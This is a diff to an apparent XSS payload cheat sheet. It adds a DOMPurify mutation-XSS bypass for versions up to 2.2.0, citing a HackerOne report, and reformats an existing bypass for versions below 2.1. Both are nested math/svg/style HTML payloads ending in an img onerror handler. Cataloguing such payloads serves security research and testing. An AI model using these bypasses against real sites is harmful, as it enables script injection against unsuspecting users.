@@ -44,12 +44,22 @@ DOMPurify.sanitize('<UL><li><A HREF=//google.com>click</UL>'); // becomes <ul><l
 
 - [Playing with DOMPurify custom elements handling](https://mizu.re/post/playing-with-dompurify-ce-handling)
 
+### Version <= 2.2.0
+
+- [Bypass in DOMPurify when sanitizing svg elements](https://hackerone.com/reports/1024734)
+
+```html
+<form><math><mtext></form><form><mglyph><svg>
+<mtext><style><path id="</style><img onerror=alert(\'XSS\') src>">
+```
+
 ### Version < 2.1
 
 - [Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
 
 ```html
-<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<math><mtext><table><mglyph><style>
+<!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
 ```
 
 ### Version < 2.0.17
